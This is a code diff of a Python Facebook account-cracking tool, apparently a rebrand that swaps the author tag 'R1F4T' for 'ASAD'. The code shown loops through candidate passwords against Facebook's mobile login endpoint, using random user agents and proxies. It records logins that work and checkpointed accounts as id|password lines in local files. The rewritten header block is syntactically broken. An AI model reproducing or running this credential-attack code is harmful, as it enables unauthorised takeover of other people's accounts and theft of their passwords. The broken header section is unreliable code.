@@ -1,7 +1,3 @@
-#R1F4T
-
-
-
 import os
 try:
 	import requests
@@ -150,21 +146,20 @@ awan =[
 'Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',]
 logo=("""\033[1;97m
-            o           o__ __o           o           o__ __o      
-        <|>         /v     v\         <|>         <|     v\     
-        / \        />       <\        / \         / \     <\    
-      o/   \o     _\o____           o/   \o       \o/       \o  
-     <|__ __|>         \_\__o__    <|__ __|>       |         |> 
-     /       \               \     /       \      / \       //  
-   o/         \o   \         /   o/         \o    \o/      /    
-  /v           v\   o       o   /v           v\    |      o     
- />             <\  <\__ __/>  />             <\  / \  __/>     
+  /$$$$$$                            /$$
+ /$$__  $$                          | $$
+| $$  \ $$  /$$$$$$$  /$$$$$$   /$$$$$$$
+| $$$$$$$$ /$$_____/ |____  $$ /$$__  $$
+| $$__  $$|  $$$$$$   /$$$$$$$| $$  | $$
+| $$  | $$ \____  $$ /$$__  $$| $$  | $$
+| $$  | $$ /$$$$$$$/|  $$$$$$$|  $$$$$$$
+|__/  |__/|_______/  \_______/ \_______/
 \33[1;37m----------------------------------------------
-→   Owner      :  ASAD 
+→   Owner      :  ASAD
 →   Facebook   :  AT Asadul Islam
 →   Github     :  Asad0906
 →   Tool Type  :  \x1b[1;91mFREE
-\x1b[1;97m→   Version    :  1.0
+\x1b[1;97m→   Version    :  1.1
 \33[1;37m----------------------------------------------""")
 def linex():
 	print('\33[1;37m----------------------------------------------')
@@ -279,7 +274,7 @@ def menu():
 		
 def mmm(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mR1F4T\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mASAD\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -350,7 +345,7 @@ application_version_code=str(random.randint(000000000,999999999))
 ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR/Reliance JIO;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]'
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mR1F4T\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mASAD\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
     
 	session = requests.Session()
 	try:
@@ -376,14 +371,14 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\033[1;92m[R1F4T-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/R1F4T-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[ASAD-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/ASAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
-					print('\33[1;91m[R1F4T-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/R1F4T-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;91m[ASAD-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/ASAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -810,7 +805,7 @@ def fcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mR1F4T\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mASAD\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			nip=random.choice(prox)
@@ -826,40 +821,37 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
-			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
-			'method': 'GET',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
-			'dnt':'1', 
-			'x-requested-with':'mark.via.gp', 
-			'sec-fetch-site': 'none',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-user': '?1',
-			'sec-fetch-dest': 'document',
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
-			"sec-ch-prefers-color-scheme": "light",
-			'user-agent': ua}
+			header_freefb = {':authority: 'p.facebook.com' .
+            :method: GET
+            :path: /login/?next&ref=dbl&fl&login_from_aymh=1&refid=8
+            :scheme: https
+            accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+            accept-encoding: gzip, deflate, br
+            accept-language: en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
+            sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"
+            sec-ch-ua-mobile: ?1
+            sec-ch-ua-platform: "Android"
+            sec-fetch-dest: document
+            sec-fetch-mode: navigate
+            sec-fetch-site:same-origin
+            sec-fetch-user: ?1
+            upgrade-insecure-requests: 1
+            user-agent: Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5,': ua}
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[R1F4T-OK] '+cid+' | '+ps+'\033[1;32m')
-				open('R1F4T-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				print('\033[1;92m[ASAD-OK] '+cid+' | '+ps+'\033[1;32m')
+				open('ASAD-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\33[1;31m[R1F4T-CP] '+cid+' | '+ps+'\33[0;97m')
-				open('R1F4T-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				print('\33[1;31m[ASAD-CP] '+cid+' | '+ps+'\33[0;97m')
+				open('ASAD-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
